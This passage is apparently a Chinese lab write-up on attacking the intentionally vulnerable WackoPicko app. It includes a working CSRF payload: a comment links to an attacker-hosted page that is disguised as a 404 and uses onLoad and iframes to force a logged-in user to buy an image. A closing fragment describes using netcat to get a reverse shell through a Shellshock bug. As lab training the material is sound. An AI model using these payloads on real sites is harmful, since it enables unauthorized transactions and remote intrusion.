...
1. 使用DVWA靶机，`WackoPicko`
2. 注册两个账号，一个`attacker`,一个`user`
3. 使用`attacker`账号上传一个图片，并且在图片底下使用带有`xsrf`攻击的评论

```html
This image looks a lot like <a href="http://攻击者服务器/wackopurchase.html" target="_blank">this</a>
```

4. kali主机上开启apache服务，并且构造一个用于用户购买图片的服务

```html
<html> 
<head></head> 
<body onLoad='window.location="http://目标服务器/WackoPicko/cart/action.php?action=purchase";setTimeout("window.close;",1000)'> 
<h1>Error 404: Not found</h1> 
<iframe src="http://目标服务器/WackoPicko/cart/action.php?action=add&picid=16"> 
<iframe src="http://目标服务器/WackoPicko/cart/review.php" > 
<iframe src="http://目标服务器/WackoPicko/cart/confirm.php"> 
</iframe> 
</iframe> 
</iframe> 
</body>
...
5. 一般到这里就是使用`user`的账号登录，并且点击那个评论，就会自动购买了一个图片。但是由于这几个请求是需要验证cookie，因此有可能这里发起的cookie并非是user而是记录了其它账号，造成验证失败。因此在登录user账号之前，需要现在浏览器，将cookie信息清除。
...
这里主要用netcat做双向连接，一边监听，一边主动发起连接，一般是由于攻击目标存在防火墙，不能通过攻击方发起连接， 通过这个`ShellSock`漏洞，让被攻击主机主动发起连接。
